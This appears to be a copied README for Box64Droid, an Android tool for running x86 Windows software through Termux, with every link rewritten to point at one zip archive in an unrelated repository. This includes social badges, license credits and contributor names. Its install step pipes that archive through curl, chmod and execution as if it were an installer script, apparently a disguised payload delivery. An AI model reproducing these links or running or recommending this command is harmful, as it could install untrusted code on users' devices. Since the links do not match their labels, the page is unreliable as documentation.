# Box64Droid
[![telegram](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)
[![discord](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)

Box64Droid is a project with scripts that automate installing preconfigured rootfs with [Box64](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip), [Box86](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip), [Wine](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip), [DXVK](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip), [D8VK](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) on Android. Originally was a [fork](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) of [Box4Droid](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) with Box64.

- News about the project are published on the [Telegram](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) channel.
- The project site is available [here](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip).

## Installation instructions
1. Install [Termux](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip+https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip), [Termux-x11](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) and [Termux:Widget](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip+https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip).
2. In Termux, run the Box64Droid install command, select need version (i recommend native) and wait until it's installed: `curl -o install https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip && chmod +x install && ./install`
3. After the installation is completed, run `box64droid --start`. The script will start Termux-X11 and show the start menu.
4. To use Input Bridge, install 0.1.9 apk and then simply run the app on Android and in Wine from the start menu.

## Launch via homescreen using Termux:Widget (native version)
You can launch and update Box64Droid via start menu, just create Termux:Widget widget and you will see these options

## System requirements

- Adreno 610+ (Other GPUs are supported by VirGL, but many games might not work)
- Android 12+ (non-root, VirGL version), Android 10+ (root version), Android 9+ (native version)
- 64-bit Android
- You also need ~4,2GB (for root version), 4,5GB (for non-root version) or ~3,3GB (for VirGL version) worth of free space for the installation to run without problems.

To increase performance and stability, use the root version (root access required) or the native version (less stable but offers the same performance as the root version).

## Configuring

- You can choose to use environment variables; there are three files: `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip`, `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip`, and `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip`. These files are created and found in the /sdcard/Box64Droid/ folder after the first Box64Droid run.
- The `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip` file includes configurations for rootfs, Box86, Box64, and Wine. You can utilize the Box86 and Box64 environment variables; you can find more information about them [here](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) and [here](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip). You can add as many variables as needed.
- The `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip` file is intended for using environment variables related to [DXVK_HUD](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip).
- The `https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip` file is intended for using environment variables related to [dxvk](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip).

## Known issues

- Very fast "install" (which really failed due a Termux update packages process failed). Clear Termux data will resolve this issue.
- Android 12+ may terminate Termux, displaying `[Process completed (signal 9) - press Enter]`. To resolve this, execute the following command in from your PC (you need [plaform-tools](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) and enabled ADB debugger in phone): `adb shell "/system/bin/device_config put activity_manager max_phantom_processes 2147483647"`.
- Winetricks takes a long time to run when Proton is installed (non-root version).

## Instructions on how to mount SD-card external HDD/SSD (chroot version only)

If you want to mount an SD card or an external drive (HDD/SSD), you need to add the mountpoint manually. Follow these steps:

1. Mount the drive onto the phone storage:
   - For an SD card, navigate to `/storage` and check the folders (using `sudo ls`), for example, `8D3E-2B7K`.
   - For external drives, navigate to `/mnt/media_rw` and check for a folder like `C3G3H6B8A56212H7`.
2. Mount the drive into the chroot envrionment:
   - Type `nano $PREFIX/bin/box64droid` and add the mount command before the `sudo chroot login ...` line: `sudo mount --bind /mnt/media_rw/drivename (or /storage/sdcardname) $ROOTFSPATH/needfolder`.
   - You need to manually create `needfolder` in the `~/ubuntu` folder by using `sudo mkdir foldername`.

## Applications and scripts which were used in Box64Droid
- [Termux-app](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - GPLv3 license
- [Box64 by ptitseb](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - MIT license
- [Box86 by ptitseb](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - MIT license
- [Wine Stable, Staging and Staging-tkg GPL-2.1 license](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) (builded by [Kron4ek](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) by MIT License), [Wine Proton by Valve](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) (own license), [Wine GE](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) (using in Lutris)
- [Mesa](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - MIT, Khronos, SGI Free Software License B and Boost (permissive) licenses
- [Termux-x11](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - GPL-3.0 license
- [DXVK](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - Zlib license
- [Proot-distro](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - GPL-3.0 license
- [Forked Mesa to work Turnip on Adreno 730 and 740](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)
- [D8VK](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - Zlib license
- [DXVK-Async](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)
- [DXVK-GPLAsync](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)
- [WineD3D for Windows](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - GPL-2.0+ license
- [Winetricks](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip)
- [vkd3d-proton](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - LGPL v2.1 license
- [glibc-prefix](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - MIT license

## Thanks to:
- [Herick75](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - for providing patches that made compiling Mesa Turnip possible
- [Inguna87](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - for start chroot fix for MIUI and Oxygen
- [Alfhashut](https://raw.githubusercontent.com/Marzelthan29/Box64Droid/main/scripts/Box_Droid_v2.6.zip) - inspired me to try VirGL again and tried to help me with it
